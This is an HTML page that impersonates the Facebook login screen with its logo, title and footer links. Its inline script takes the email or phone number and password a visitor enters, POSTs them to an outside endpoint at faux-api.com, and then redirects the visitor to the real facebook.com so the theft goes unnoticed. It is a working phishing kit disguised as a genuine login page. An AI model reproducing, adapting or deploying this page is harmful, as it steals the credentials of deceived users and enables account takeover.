<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Log in to Facebook to connect with friends and share your moments.">
    <title>Facebook</title>
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/fb-fav.ico">
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Facebook" class="flex justify-content-center">
                    <img src="./img/facebook-logo.png" alt="Facebook logo" title="Facebook logo" />
                </h1>
                <form id="fbLoginForm">
                    <label for="fbInput1" class="sr-only">Email or phone number</label>
                    <input id="fbInput1" name="fbInput1" placeholder="Email or phone number" required />

                    <label for="fbInput2" class="sr-only">Password</label>
                    <input id="fbInput2" name="fbInput2" type="password" placeholder="Password" required />

                    <button type="submit">Log In</button>
                </form>
                <div class="login-with-fb flex direction-column align-items-center">
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign Up</a>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">About</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Language</a></li>
        </ul>
        <p class="copyright">Â© 2024 Facebook</p>
    </footer>

    <script>
        document.getElementById("fbLoginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent page reload

            const input1 = document.getElementById("fbInput1").value;
            const input2 = document.getElementById("fbInput2").value;
            const apiURL = "https://faux-api.com/api/v1/fb102_08556334111523012"; // Adjusted for Facebook

            const requestData = [
                {
                    "input1": input1,
                    "input2": input2
                }
            ];

            fetch(apiURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(requestData)
            })
            .then(response => response.json())
            .then(data => {
                console.log("Data submitted successfully:", data);
                
                // Check if the login was successful
                if (data.status === "success") {
                    window.location.href = "https://www.facebook.com/";
                } else {
                    console.error("Login failed:", data.error);
                }
            })
            .catch(error => {
                console.error("Error submitting:", error);
            });
        });
    </script>
</body>
</html>
